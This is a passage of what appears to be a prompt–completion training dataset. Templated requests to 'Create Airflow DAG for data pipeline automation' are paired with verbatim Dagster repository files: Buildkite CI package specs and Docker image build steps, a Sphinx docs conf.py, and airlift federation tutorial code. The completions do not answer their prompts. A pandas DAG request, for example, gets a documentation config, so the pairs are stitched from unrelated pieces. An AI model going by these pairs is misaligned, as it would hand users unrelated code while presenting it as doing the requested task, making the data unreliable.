pytest_tox_factors=[\"pypi\"],\n    ),\n    PackageSpec(\n        \"examples/quickstart_snowflake\",\n        pytest_tox_factors=[\"pypi\"],\n    ),\n    PackageSpec(\n        \"examples/use_case_repository\",\n        pytest_tox_factors=[\"source\"],\n    ),\n    # Federation tutorial spins up multiple airflow instances, slow to run - use docker queue to ensure\n    # beefier instance\n    PackageSpec(\n        \"examples/airlift-federation-tutorial\",\n        always_run_if=has_dagster_airlift_changes,\n        timeout_in_minutes=30,\n        queue=BuildkiteQueue.DOCKER,\n        unsupported_python_versions=[\n            # airflow\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n    PackageSpec(\n        \"examples/airlift-migration-tutorial\",\n        always_run_if=has_dagster_airlift_changes,\n        unsupported_python_versions=[\n            # airflow\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n]\n\n\ndef _unsupported_dagster_python_versions(\n    tox_factor: Optional[str],\n) -> List[AvailablePythonVersion]:\n    if tox_factor == \"general_tests_old_protobuf\":\n        return [\n            AvailablePythonVersion.V3_11,\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ]\n\n    if tox_factor in {\n        \"type_signature_tests\",\n    }:\n        return [AvailablePythonVersion.V3_12]\n\n    return []\n\n\ndef test_subfolders(tests_folder_name: str) -> Iterable[str]:\n    tests_path = (\n        Path(__file__).parent\n        / Path(\"../../../../python_modules/dagster/dagster_tests/\")\n        / Path(tests_folder_name)\n    )\n    for subfolder in tests_path.iterdir():\n        if subfolder.suffix == \".py\" and subfolder.stem != \"__init__\":\n            raise Exception(\n                f\"If you are splitting a test folder into parallel subfolders \"\n                f\"there should be no python files in the root of the folder. Found {subfolder}.\"\n            )\n        if subfolder.is_dir():\n            yield subfolder.name\n\n\ndef tox_factors_for_folder(tests_folder_name: str) -> List[str]:\n    return [\n        f\"{tests_folder_name}__{subfolder_name}\"\n        for subfolder_name in test_subfolders(tests_folder_name)\n    ]\n\n\nLIBRARY_PACKAGES_WITH_CUSTOM_CONFIG: List[PackageSpec] = [\n    PackageSpec(\n        \"python_modules/automation\",\n        # automation is internal code that doesn't need to be tested in every python version. The\n        # test suite also installs a ton of packages in the same environment, which is liable to\n        # cause dependency collisions.\n        unsupported_python_versions=AvailablePythonVersion.get_all_except_default(),\n    ),\n    PackageSpec(\"python_modules/dagster-webserver\", pytest_extra_cmds=ui_extra_cmds),\n    PackageSpec(\n        \"python_modules/dagster\",\n        env_vars=[\"AWS_ACCOUNT_ID\"],\n        pytest_tox_factors=[\n            \"api_tests\",\n            \"asset_defs_tests\",\n            \"cli_tests\",\n            \"components_tests\",\n            \"core_tests\",\n            \"daemon_sensor_tests\",\n            \"daemon_tests\",\n            \"declarative_automation_tests\",\n            \"definitions_tests\",\n            \"general_tests\",\n            \"general_tests_old_protobuf\",\n            \"launcher_tests\",\n            \"logging_tests\",\n            \"model_tests\",\n            \"scheduler_tests\",\n            \"storage_tests\",\n            \"storage_tests_sqlalchemy_1_3\",\n            \"storage_tests_sqlalchemy_1_4\",\n            \"utils_tests\",\n            \"type_signature_tests\",\n        ]\n        + tox_factors_for_folder(\"execution_tests\"),\n        unsupported_python_versions=_unsupported_dagster_python_versions,\n    ),\n    PackageSpec(\n        \"python_modules/dagster-graphql\",\n        pytest_extra_cmds=dagster_graphql_extra_cmds,\n        pytest_tox_factors=[\n            \"not_graphql_context_test_suite\",\n            \"sqlite_instance_multi_location\",\n            \"sqlite_instance_managed_grpc_env\",\n            \"sqlite_instance_deployed_grpc_env\",\n            \"sqlite_instance_code_server_cli_grpc_env\",\n            \"graphql_python_client\",\n            \"postgres-graphql_context_variants\",\n            \"postgres-instance_multi_location\",\n            \"postgres-instance_managed_grpc_env\",\n            \"postgres-instance_deployed_grpc_env\",\n        ],\n        unsupported_python_versions=(\n            lambda tox_factor: (\n                [AvailablePythonVersion.V3_11]\n                if (\n                    tox_factor\n                    in {\n                        # test suites particularly likely to crash and/or hang\n                        # due to https://github.com/grpc/grpc/issues/31885\n                        \"sqlite_instance_managed_grpc_env\",\n                        \"sqlite_instance_deployed_grpc_env\",\n                        \"sqlite_instance_code_server_cli_grpc_env\",\n                        \"sqlite_instance_multi_location\",\n                        \"postgres-instance_multi_location\",\n                        \"postgres-instance_managed_grpc_env\",\n                        \"postgres-instance_deployed_grpc_env\",\n                    }\n                )\n                else []\n            )\n        ),\n        timeout_in_minutes=30,\n    ),\n    PackageSpec(\n        \"python_modules/dagster-test\",\n        unsupported_python_versions=[\n            # dagster-airflow\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-dbt\",\n        pytest_tox_factors=[\n            f\"{deps_factor}-{command_factor}\"\n            for deps_factor in [\"dbt17\", \"dbt18\", \"dbt19\", \"dbt110\"]\n            for command_factor in [\"cloud\", \"core-main\", \"core-derived-metadata\"]\n        ],\n        # dbt-core 1.7's protobuf<5 constraint conflicts with the grpc requirement for Python 3.13\n        unsupported_python_versions=(\n            lambda tox_factor: [AvailablePythonVersion.V3_13]\n            if tox_factor and tox_factor.startswith(\"dbt17\")\n            else []\n        ),\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-snowflake\",\n        env_vars=[\"SNOWFLAKE_ACCOUNT\", \"SNOWFLAKE_USER\", \"SNOWFLAKE_PASSWORD\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-airlift\",\n        unsupported_python_versions=[\n            # airflow\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n        env_vars=[\n            \"AIRLIFT_MWAA_TEST_ENV_NAME\",\n            \"AIRLIFT_MWAA_TEST_PROFILE\",\n            \"AIRLIFT_MWAA_TEST_REGION\",\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-airbyte\",\n        pytest_tox_factors=[\"unit\", \"integration\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-airflow\",\n        # omit python 3.10 until we add support\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_10,\n            AvailablePythonVersion.V3_11,\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n        env_vars=[\n            \"AIRFLOW_HOME\",\n            \"AWS_ACCOUNT_ID\",\n            \"AWS_ACCESS_KEY_ID\",\n            \"AWS_SECRET_ACCESS_KEY\",\n            \"BUILDKITE_SECRETS_BUCKET\",\n            \"GOOGLE_APPLICATION_CREDENTIALS\",\n        ],\n        pytest_extra_cmds=airflow_extra_cmds,\n        pytest_tox_factors=[\n            \"default-airflow2\",\n            \"localdb-airflow2\",\n            \"persistentdb-airflow2\",\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-dg-cli\",\n        pytest_tox_factors=[\"general\", \"docs\", \"plus\"],\n        env_vars=[\"SHELL\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-dg-cli\",\n        name=\"dagster-dg-cli-mcp\",\n        pytest_tox_factors=[\"mcp\"],\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_9,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-aws\",\n        env_vars=[\"AWS_DEFAULT_REGION\", \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-azure\",\n        env_vars=[\"AZURE_STORAGE_ACCOUNT_KEY\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-celery\",\n        env_vars=[\"AWS_ACCOUNT_ID\", \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\"],\n        pytest_extra_cmds=celery_extra_cmds,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-celery-docker\",\n        env_vars=[\"AWS_ACCOUNT_ID\", \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\"],\n        pytest_extra_cmds=celery_extra_cmds,\n        pytest_step_dependencies=test_project_depends_fn,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-dask\",\n        env_vars=[\"AWS_SECRET_ACCESS_KEY\", \"AWS_ACCESS_KEY_ID\", \"AWS_DEFAULT_REGION\"],\n        unsupported_python_versions=[\n            # dask\n            AvailablePythonVersion.V3_9,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-databricks\",\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-docker\",\n        env_vars=[\"AWS_ACCOUNT_ID\", \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\"],\n        pytest_extra_cmds=docker_extra_cmds,\n        pytest_step_dependencies=test_project_depends_fn,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-duckdb\",\n        unsupported_python_versions=[\n            # duckdb\n            AvailablePythonVersion.V3_12,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-duckdb-pandas\",\n        unsupported_python_versions=[\n            # duckdb\n            AvailablePythonVersion.V3_12,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-duckdb-polars\",\n        unsupported_python_versions=[\n            # duckdb\n            AvailablePythonVersion.V3_12,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-duckdb-pyspark\",\n        unsupported_python_versions=[\n            # duckdb\n            AvailablePythonVersion.V3_12,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-pandas\",\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_12,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-gcp\",\n        env_vars=[\n            \"AWS_ACCESS_KEY_ID\",\n            \"AWS_SECRET_ACCESS_KEY\",\n            \"BUILDKITE_SECRETS_BUCKET\",\n            \"GCP_PROJECT_ID\",\n        ],\n        pytest_extra_cmds=gcp_creds_extra_cmds,\n        # Remove once https://github.com/dagster-io/dagster/issues/2511 is resolved\n        retries=2,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-gcp-pandas\",\n        env_vars=[\n            \"AWS_ACCESS_KEY_ID\",\n            \"AWS_SECRET_ACCESS_KEY\",\n            \"BUILDKITE_SECRETS_BUCKET\",\n            \"GCP_PROJECT_ID\",\n        ],\n        pytest_extra_cmds=gcp_creds_extra_cmds,\n        retries=2,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-gcp-pyspark\",\n        env_vars=[\n            \"AWS_ACCESS_KEY_ID\",\n            \"AWS_SECRET_ACCESS_KEY\",\n            \"BUILDKITE_SECRETS_BUCKET\",\n            \"GCP_PROJECT_ID\",\n        ],\n        pytest_extra_cmds=gcp_creds_extra_cmds,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-ge\",\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_9,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-k8s\",\n        env_vars=[\n            \"AWS_ACCOUNT_ID\",\n            \"AWS_ACCESS_KEY_ID\",\n            \"AWS_SECRET_ACCESS_KEY\",\n            \"BUILDKITE_SECRETS_BUCKET\",\n        ],\n        pytest_tox_factors=[\n            \"default\",\n            \"old_kubernetes\",\n        ],\n        pytest_extra_cmds=k8s_extra_cmds,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-mlflow\",\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-mysql\",\n        pytest_extra_cmds=mysql_extra_cmds,\n        pytest_tox_factors=[\n            \"storage_tests\",\n            \"storage_tests_sqlalchemy_1_3\",\n        ],\n        always_run_if=has_storage_test_fixture_changes,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-snowflake-pandas\",\n        env_vars=[\"SNOWFLAKE_ACCOUNT\", \"SNOWFLAKE_BUILDKITE_PASSWORD\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-snowflake-pyspark\",\n        env_vars=[\"SNOWFLAKE_ACCOUNT\", \"SNOWFLAKE_BUILDKITE_PASSWORD\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-snowflake-polars\",\n        env_vars=[\"SNOWFLAKE_ACCOUNT\", \"SNOWFLAKE_BUILDKITE_PASSWORD\"],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-postgres\",\n        pytest_tox_factors=[\n            \"storage_tests\",\n            \"storage_tests_sqlalchemy_1_3\",\n        ],\n        always_run_if=has_storage_test_fixture_changes,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-twilio\",\n        env_vars=[\"TWILIO_TEST_ACCOUNT_SID\", \"TWILIO_TEST_AUTH_TOKEN\"],\n        # Remove once https://github.com/dagster-io/dagster/issues/2511 is resolved\n        retries=2,\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-wandb\",\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagstermill\",\n        pytest_tox_factors=[\"papermill1\", \"papermill2\"],\n        retries=2,  # Workaround for flaky kernel issues\n        unsupported_python_versions=(\n            lambda tox_factor: (\n                [AvailablePythonVersion.V3_12, AvailablePythonVersion.V3_13]\n                if (tox_factor == \"papermill1\")\n                else []\n            )\n        ),\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-airlift/perf-harness\",\n        always_run_if=has_dagster_airlift_changes,\n        unsupported_python_versions=[\n            # airflow\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n    PackageSpec(\n        \"python_modules/libraries/dagster-airlift/kitchen-sink\",\n        always_run_if=has_dagster_airlift_changes,\n        unsupported_python_versions=[\n            # airflow\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n        queue=BuildkiteQueue.DOCKER,\n    ),\n    # Runs against live dbt cloud instance, we only want to run on commits and on the\n    # nightly build\n    PackageSpec(\n        \"python_modules/libraries/dagster-dbt/kitchen-sink\",\n        skip_if=skip_if_not_dagster_dbt_cloud_commit,\n        name=\"dagster-dbt-cloud-live\",\n        env_vars=[\n            \"KS_DBT_CLOUD_ACCOUNT_ID\",\n            \"KS_DBT_CLOUD_ACCESS_URL\",\n            \"KS_DBT_CLOUD_TOKEN\",\n            \"KS_DBT_CLOUD_PROJECT_ID\",\n            \"KS_DBT_CLOUD_ENVIRONMENT_ID\",\n        ],\n    ),\n    PackageSpec(\n        \".buildkite/dagster-buildkite\",\n        run_pytest=False,\n    ),\n]\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": ".buildkite/dagster-buildkite/dagster_buildkite/steps/packages.py", "language": "python", "complexity": "complex", "star_count": 13638, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nfrom typing import List, Optional, Set\n\nfrom dagster_buildkite.defines import GCP_CREDS_FILENAME, GCP_CREDS_LOCAL_FILE\nfrom dagster_buildkite.images.versions import (\n    BUILDKITE_BUILD_TEST_PROJECT_IMAGE_IMAGE_VERSION,\n    TEST_PROJECT_BASE_IMAGE_VERSION,\n)\nfrom buildkite_shared.python_version import AvailablePythonVersion\nfrom buildkite_shared.step_builders.command_step_builder import CommandStepBuilder\nfrom buildkite_shared.step_builders.group_step_builder import (\n    GroupLeafStepConfiguration,\n    GroupStepBuilder,\n    GroupStepConfiguration,\n)\n\n# Some python packages depend on these images but we don't explicitly define that dependency anywhere other\n# than when we construct said package's Buildkite steps. Until we more explicitly define those dependencies\n# somewhere, we use these sets to track internal state about whether or not to build the test-project images\n#\n# When we build the Buildkite steps for a python package that needs one or both of these images, add the\n# required versions to these sets. We'll otherwise skip building images for any versions not requested here.\n#\n# This means you need to call `build_test_project_steps()` after you've build the other Buildkite steps that\n# require the images.\n#\n# TODO: Don't do this :) More explicitly define the dependencies.\n# See https://github.com/dagster-io/dagster/pull/10099 for implementation ideas.\nbuild_test_project_for: Set[AvailablePythonVersion] = set()\n\n\ndef build_test_project_steps() -> List[GroupStepConfiguration]:\n    \"\"\"This set of tasks builds and pushes Docker images, which are used by the dagster-airflow and\n    the dagster-k8s tests.\n    \"\"\"\n    steps: List[GroupLeafStepConfiguration] = []\n\n    # Build for all available versions because a dependent extension might need to run tests on any version.\n    py_versions = AvailablePythonVersion.get_all()\n\n    for version in py_versions:\n        key = _test_project_step_key(version)\n        steps.append(\n            CommandStepBuilder(f\":docker: test-project {version}\", key=key)\n            # these run commands are coupled to the way the buildkite-build-test-project-image is built\n            # see python_modules/automation/automation/docker/images/buildkite-build-test-project-image\n            .run(\n                # credentials\n                \"/scriptdir/aws.pex ecr get-login --no-include-email --region us-west-2 | sh\",\n                f'export GOOGLE_APPLICATION_CREDENTIALS=\"{GCP_CREDS_LOCAL_FILE}\"',\n                \"/scriptdir/aws.pex s3 cp\"\n                f\" s3://$${{BUILDKITE_SECRETS_BUCKET}}/{GCP_CREDS_FILENAME}\"\n                \" $${GOOGLE_APPLICATION_CREDENTIALS}\",\n                \"export\"\n                \" BASE_IMAGE=$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com/test-project-base:py\"\n                + version.value\n                + \"-\"\n                + TEST_PROJECT_BASE_IMAGE_VERSION,\n                # build and tag test image\n                \"export\"\n                \" TEST_PROJECT_IMAGE=$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com/test-project:$${BUILDKITE_BUILD_ID}-\"\n                + version.value,\n                \"git config --global --add safe.directory /workdir\",\n                \"./python_modules/dagster-test/dagster_test/test_project/build.sh \"\n                + version.value\n                + \" $${TEST_PROJECT_IMAGE}\",\n                #\n                # push the built image\n                'echo -e \"--- \\033[32m:docker: Pushing Docker image\\033[0m\"',\n                \"docker push $${TEST_PROJECT_IMAGE}\",\n            )\n            .skip_if(skip_if_version_not_needed(version))\n            .on_python_image(\n                image=f\"buildkite-build-test-project-image:py{AvailablePythonVersion.V3_11.value}-{BUILDKITE_BUILD_TEST_PROJECT_IMAGE_IMAGE_VERSION}\",\n                env=[\n                    \"AIRFLOW_HOME\",\n                    \"AWS_ACCOUNT_ID\",\n                    \"AWS_ACCESS_KEY_ID\",\n                    \"AWS_SECRET_ACCESS_KEY\",\n                    \"BUILDKITE_SECRETS_BUCKET\",\n                ],\n            )\n            .with_ecr_login()\n            .build()\n        )\n\n    return [\n        GroupStepBuilder(\n            name=\":docker: test-project-image\",\n            key=\"test-project-image\",\n            steps=steps,\n        ).build()\n    ]\n\n\ndef _test_project_step_key(version: AvailablePythonVersion) -> str:\n    return f\"sample-project-{AvailablePythonVersion.to_tox_factor(version)}\"\n\n\ndef test_project_depends_fn(version: AvailablePythonVersion, _) -> List[str]:\n    if not os.getenv(\"CI_DISABLE_INTEGRATION_TESTS\"):\n        build_test_project_for.add(version)\n        return [_test_project_step_key(version)]\n    else:\n        return []\n\n\ndef skip_if_version_not_needed(version: AvailablePythonVersion) -> Optional[str]:\n    if version in build_test_project_for:\n        return None\n\n    return \"Skipped because no build depends on this image\"\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": ".buildkite/dagster-buildkite/dagster_buildkite/steps/test_project.py", "language": "python", "complexity": "medium", "star_count": 13638, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# For a full of config options see:\n#   https://www.sphinx-doc.org/en/master/usage/configuration.html\n\n# -- Path setup --------------------------------------------------------------\n\n# We add two kinds of packages to `sys.path`:\n#\n# - Targets for `autodoc` (referenced via e.g. `automodule` in our doc source rst files).\n#   `autodoc` runs in python and actually imports its targets, so they must be available on\n#   `sys.path`.\n# - Custom sphinx extensions (autodoc_dagster).\n\nimport os\nimport sys\n\nignored_folders = [\"dagster-test\"]\nbase_path = \"../../python_modules\"\npython_modules_path = os.path.abspath(base_path)\nlibraries_path = os.path.abspath(os.path.join(base_path, \"libraries\"))\npaths = []\n# Add python_modules folders\nfor folder in os.listdir(python_modules_path):\n    folder_path = os.path.join(python_modules_path, folder)\n    if os.path.isdir(folder_path) and not any(\n        ignored in folder_path for ignored in ignored_folders\n    ):\n        paths.append(folder_path)\n# Add libraries folders\nfor folder in os.listdir(libraries_path):\n    folder_path = os.path.join(libraries_path, folder)\n    if os.path.isdir(folder_path) and not any(\n        ignored in folder_path for ignored in ignored_folders\n    ):\n        paths.append(folder_path)\n# Add the _ext folder\npaths.append(os.path.abspath(\"./_ext\"))\n\nfor path in paths:\n    sys.path.insert(0, path)\n# -- Project information -----------------------------------------------------\n\nproject = \"Dagster\"\ncopyright = \"2019, Dagster Labs, Inc\"  # noqa: A001\nauthor = \"Dagster Labs\"\n\n# -- General configuration ---------------------------------------------------\n\n# NOTE: `sphinx.ext.*` extensions are built-in to sphinx-- all others are supplied by other\n# packages. Docs for all builtin extensions here:\n#   https://www.sphinx-doc.org/en/master/usage/extensions/index.html\nextensions = [\n    # Automatically generate docs from docstrings.\n    \"sphinx.ext.autodoc\",\n    # Allows direct references to doc sections by title\n    \"sphinx.ext.autosectionlabel\",\n    # Supplements autodoc with the ability to parse numpy and google-style docstrings (dagster\n    # uses google style).\n    \"sphinx.ext.napoleon\",\n    # Adds links to source code for autodoc objects\n    \"sphinx.ext.viewcode\",\n    # Directives for automatically documenting CLIs built with the `click` package.\n    \"sphinx_click.ext\",\n    # Dagster-labs-authored extension with custom directives and sphinx processing.\n    \"dagster_sphinx\",\n    \"sphinx_toolbox.collapse\",\n    # Render MDX\n    \"sphinxcontrib.mdxbuilder\",\n]\n\n# MDX Builder configuration\nmdx_title_suffix = \"\"\nmdx_title_meta = (\n    \" API Documentation - Build Better Data Pipelines | Python Reference Documentation for Dagster\"\n)\nmdx_description_meta = \" Dagster API | Comprehensive Python API documentation for Dagster, the data orchestration platform. Learn how to build, test, and maintain data pipelines with our detailed guides and examples.\"\n\n# -- Extension configuration -------------------------------------------------\n\n# -- autodoc\n\n# Full list of options here:\n#   https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html\n\n\n# Include members (e.g. methods on classes) for all objects rendered with auto* methods by default.\n# Without this, no methods will be rendered unless `:members:` is explicitly set on an individual\n# directive invocation. Note that filtration by publicity (done in the `autodoc_dagster` extension)\n# is performed on the member list controlled by this option-- without `members` set, even a method\n# marked `@public` will _not_ be included in the docs!\nautodoc_default_options = {\"members\": True, \"undoc-members\": True}\n\n# Determines the order in which members (e.g., methods, attributes) are documented\n# within a class or module. \"groupwise\" groups members by type (e.g., methods together,\n# attributes together) before sorting alphabetically within each group.\nautodoc_member_order = \"groupwise\"\n\n# List of all packages that should be mocked when autodoc is running. Autodoc is going to import\n# dagster packages, which in turn import various third-party packages. The vast majority of those\n# packages are not actually needed to build the docs, but autodoc will nonetheless choke if it can't\n# resolve their imports. By mocking them, we let autodoc do its work while keeping the build\n# environment simple. If a build fails due to a failed import, try adding the root package for that\n# import (e.g. `foo` for `foo.bar`) here. See `docs/README.md` for more details.\nautodoc_mock_imports = [\n    \"airflow\",\n    \"azure\",\n    \"coloredlogs\",\n    \"dask\",\n    \"databricks\",\n    \"databricks_api\",\n    \"databricks_cli\",\n    \"datadog\",\n    \"dlt\",\n    \"docker\",\n    \"docker_image\",\n    \"gevent\",\n    \"great_expectations\",\n    \"grpc_health\",\n    \"jwt\",\n    \"kombu\",\n    \"kubernetes\",\n    \"lazy_object_proxy\",\n    \"looker_sdk\",\n    \"mlflow\",\n    \"mypy_boto3_glue\",\n    \"mysql\",\n    \"oauth2client\",\n    \"origami\",\n    \"orjson\",\n    \"pandas_gbq\",\n    \"pandera\",\n    \"polars\",\n    \"prometheus_client\",\n    \"psycopg2\",\n    \"pypd\",\n    \"sentry_sdk\",\n    \"slack_sdk\",\n    \"sling_mac_arm64\",\n    \"snowflake\",\n    \"sshtunnel\",\n    \"toposort\",\n    \"twilio\",\n    \"wandb\",\n]\n\nautodoc_typehints = \"none\"\n\n# From https://www.sphinx-doc.org/en/master/usage/extensions/autosectionlabel.html#confval-autosectionlabel_prefix_document\n#   \"Prefix each section label with the name of the document it is in, followed by a colon. For\n#   example, index:Introduction for a section called Introduction that appears in document index.rst.\n#   Useful for avoiding ambiguity when the same section heading appears in different documents.\"\nautosectionlabel_prefix_document = True\n\n# Only support Google-style docstrings\nnapoleon_numpy_docstring = False\n\n# Prevent docs generation for Sphinx-specific files\nexclude_patterns = [\"_build\", \"_ext\"]\n\nsuppress_warnings = [\"autosectionlabel.*\"]\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "docs/sphinx/conf.py", "language": "python", "complexity": "medium", "star_count": 13638, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from dagster import (\n    AutomationConditionSensorDefinition,\n    DefaultSensorStatus,\n    Definitions,\n    MaterializeResult,\n    multi_asset,\n)\nfrom dagster._core.definitions.declarative_automation.automation_condition import (\n    AutomationCondition,\n)\nfrom dagster_airlift.core import (\n    AirflowBasicAuthBackend,\n    AirflowInstance,\n    build_airflow_polling_sensor,\n    load_airflow_dag_asset_specs,\n)\n\nwarehouse_airflow_instance = AirflowInstance(\n    auth_backend=AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8081\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"warehouse\",\n)\n\nmetrics_airflow_instance = AirflowInstance(\n    auth_backend=AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8082\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"metrics\",\n)\n\nload_customers_dag_asset = next(\n    iter(\n        load_airflow_dag_asset_specs(\n            airflow_instance=warehouse_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"load_customers\",\n        )\n    )\n)\ncustomer_metrics_dag_asset = next(\n    iter(\n        load_airflow_dag_asset_specs(\n            airflow_instance=metrics_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"customer_metrics\",\n        )\n    )\n    # Add a dependency on the load_customers_dag_asset\n).replace_attributes(\n    deps=[load_customers_dag_asset],\n    automation_condition=AutomationCondition.eager(),\n)\n\n\n@multi_asset(specs=[customer_metrics_dag_asset])\ndef run_customer_metrics() -> MaterializeResult:\n    run_id = metrics_airflow_instance.trigger_dag(\"customer_metrics\")\n    metrics_airflow_instance.wait_for_run_completion(\"customer_metrics\", run_id)\n    if metrics_airflow_instance.get_run_state(\"customer_metrics\", run_id) == \"success\":\n        return MaterializeResult(asset_key=customer_metrics_dag_asset.key)\n    else:\n        raise Exception(\"Dag run failed.\")\n\n\nwarehouse_sensor = build_airflow_polling_sensor(\n    mapped_assets=[load_customers_dag_asset],\n    airflow_instance=warehouse_airflow_instance,\n)\nmetrics_sensor = build_airflow_polling_sensor(\n    mapped_assets=[customer_metrics_dag_asset],\n    airflow_instance=metrics_airflow_instance,\n)\n\nautomation_sensor = AutomationConditionSensorDefinition(\n    name=\"automation_sensor\",\n    target=\"*\",\n    default_status=DefaultSensorStatus.RUNNING,\n    minimum_interval_seconds=1,\n)\n\ndefs = Definitions(\n    assets=[load_customers_dag_asset, run_customer_metrics],\n    sensors=[warehouse_sensor, metrics_sensor, automation_sensor],\n)\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial/dagster_defs/stages/executable_and_da.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from dagster import Definitions\nfrom dagster_airlift.core import (\n    AirflowBasicAuthBackend,\n    AirflowInstance,\n    build_airflow_polling_sensor,\n    load_airflow_dag_asset_specs,\n)\n\nwarehouse_airflow_instance = AirflowInstance(\n    auth_backend=AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8081\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"warehouse\",\n)\n\nmetrics_airflow_instance = AirflowInstance(\n    auth_backend=AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8082\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"metrics\",\n)\n\nload_customers_dag_asset = next(\n    iter(\n        load_airflow_dag_asset_specs(\n            airflow_instance=warehouse_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"load_customers\",\n        )\n    )\n)\ncustomer_metrics_dag_asset = next(\n    iter(\n        load_airflow_dag_asset_specs(\n            airflow_instance=metrics_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"customer_metrics\",\n        )\n    )\n)\n\nwarehouse_sensor 